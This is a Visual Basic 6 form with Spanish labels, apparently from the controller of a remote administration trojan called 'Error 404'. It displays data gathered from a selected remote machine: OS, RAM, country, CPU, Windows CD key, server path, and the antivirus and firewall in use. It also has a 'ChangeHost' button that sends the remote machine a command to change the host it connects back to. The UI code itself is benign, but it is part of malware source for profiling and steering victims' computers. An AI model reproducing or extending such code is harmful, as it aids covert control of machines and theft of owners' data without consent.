VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Begin VB.Form frmInfo 
   BackColor       =   &H00FFFFFF&
   Caption         =   "Error 404 - Informacion"
   ClientHeight    =   5055
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   6735
   Icon            =   "frmInfo.frx":0000
   LinkTopic       =   "Form2"
   ScaleHeight     =   5055
   ScaleWidth      =   6735
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame fraInfo 
      BorderStyle     =   0  'None
      Height          =   325
      Left            =   1680
      TabIndex        =   2
      Top             =   4700
      Width           =   4815
      Begin VB.CommandButton cmdChangeHost 
         Caption         =   "Cambiar"
         Height          =   255
         Left            =   3360
         TabIndex        =   4
         Top             =   50
         Width           =   1335
      End
      Begin VB.TextBox txtChangeHost 
         Height          =   285
         Left            =   0
         TabIndex        =   3
         Top             =   50
         Width           =   3255
      End
   End
   Begin ComctlLib.ListView LV 
      Height          =   4695
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6735
      _ExtentX        =   11880
      _ExtentY        =   8281
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   327682
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   2
      BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "Descripcion"
         Object.Width           =   4057
      EndProperty
      BeginProperty ColumnHeader(2) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         SubItemIndex    =   1
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "Informacion"
         Object.Width           =   7234
      EndProperty
   End
   Begin ComctlLib.StatusBar ST 
      Align           =   2  'Align Bottom
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Top             =   4680
      Width           =   6735
      _ExtentX        =   11880
      _ExtentY        =   661
      SimpleText      =   ""
      _Version        =   327682
      BeginProperty Panels {0713E89E-850A-101B-AFC0-4210102A8DA7} 
         NumPanels       =   1
         BeginProperty Panel1 {0713E89F-850A-101B-AFC0-4210102A8DA7} 
            Object.Width           =   2716
            MinWidth        =   2716
            Text            =   "Nombre del Equipo"
            TextSave        =   "Nombre del Equipo"
            Object.Tag             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer tmrForm 
      Interval        =   1
      Left            =   6240
      Top             =   120
   End
   Begin ComctlLib.ImageList ImageList1 
      Left            =   1080
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      MaskColor       =   12632256
      _Version        =   327682
   End
End
Attribute VB_Name = "frmInfo"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub cmdChangeHost_Click()
Send "ChangeHost|" & txtChangeHost.Text
End Sub

Private Sub Form_Load()
On Error Resume Next
Me.Caption = frmInfo.Caption & "[" & frmInfo.LV.SelectedItem & "]"

txtChangeHost.Text = frmMain.LV.SelectedItem.SubItems(3)

LV.ListItems.Add , , "Sistema Operativo"
LV.ListItems.Add , , "Sección"
LV.ListItems.Add , , "RAM"
LV.ListItems.Add , , "Service Pack"
LV.ListItems.Add , , "Versión"
LV.ListItems.Add , , "Fecha Local"
LV.ListItems.Add , , "Hora Local"
LV.ListItems.Add , , "PC Uptime"
LV.ListItems.Add , , "CD Key"
LV.ListItems.Add , , "Pais"
LV.ListItems.Add , , "Server Path"
LV.ListItems.Add , , "CPU"
LV.ListItems.Add , , "Lenguaje"
LV.ListItems.Add , , "Windows Dir"
LV.ListItems.Add , , "System Dir"
LV.ListItems.Add , , "Antivirus"
LV.ListItems.Add , , "Firewall"
Dim nam() As String
nam = Split(Me.LV.SelectedItem.SubItems(2), "/")
LV.ListItems(1).SubItems(1) = nam(0)
LV.ListItems(2).SubItems(1) = nam(1)
LV.ListItems(3).SubItems(1) = Me.LV.SelectedItem.SubItems(3)
'LV.ListItems(4).SubItems(1) = service pack
LV.ListItems(5).SubItems(1) = Me.LV.SelectedItem.SubItems(5)
'LV.ListItems(6).SubItems(1) = fecha
'LV.ListItems(7).SubItems(1) = hora
'LV.ListItems(8).SubItems(1) = pcuptime
'LV.ListItems(9).SubItems(1) = WINDowsID
LV.ListItems(10).SubItems(1) = Me.LV.SelectedItem.SubItems(4)
'LV.ListItems(11).SubItems(1) =serverpath
LV.ListItems(12).SubItems(1) = Me.LV.SelectedItem.SubItems(6)
'LV.ListItems(13).SubItems(1) =Idioma
'LV.ListItems(14).SubItems(1) =WINDIR
'LV.ListItems(15).SubItems(1) =systemdir
End Sub

Private Sub tmrForm_Timer()
If Me.Height < 1000 Then Exit Sub
If Me.Width < 1000 Then Exit Sub
LV.Height = Me.Height - 600 - 360
LV.Width = Me.Width - 250
fraInfo.Top = ST.Top + 10
End Sub
